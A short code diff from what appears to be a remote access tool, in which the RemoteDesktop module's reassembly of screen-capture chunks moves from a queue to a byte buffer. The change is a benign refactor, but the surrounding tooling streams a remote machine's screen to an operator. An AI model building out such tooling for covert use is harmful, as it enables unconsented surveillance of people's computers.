@@ -32,24 +32,18 @@ class RemoteDesktop(RATFunction):
             threading.Thread(target=self._remote_desktop_worker, daemon=True).start()
 
         # admin vars
-        self.image_build_queue = queue.Queue()
+        self.image_build_buffer = io.BytesIO()
         self.received_image_callback = lambda image_bytes: ()
 
     def handle_packet_admin_side(self, data):
         packet_id, size, last_flag, buffer = self.image_chunk_packet_struct.unpack(data)
-        self.image_build_queue.put(buffer[:size])
+        self.image_build_buffer.write(buffer[:size])
 
         if last_flag:
-            image_bytes = self.build_image()
+            image_bytes = self.image_build_buffer.getvalue()
             self.received_image_callback(image_bytes)
-
-    def build_image(self):
-        image_bytes = b''
-        queue_size = self.image_build_queue.qsize()
-        for i in range(queue_size):
-            image_bytes += self.image_build_queue.get()
-
-        return image_bytes
+            self.image_build_buffer.truncate(0)
+            self.image_build_buffer.seek(0)
 
     def handle_packet_remote_side(self, data):
         packet_id, packet_subtype, _ = struct.unpack(f"I I {PACKET_SIZE - 8}s", data)
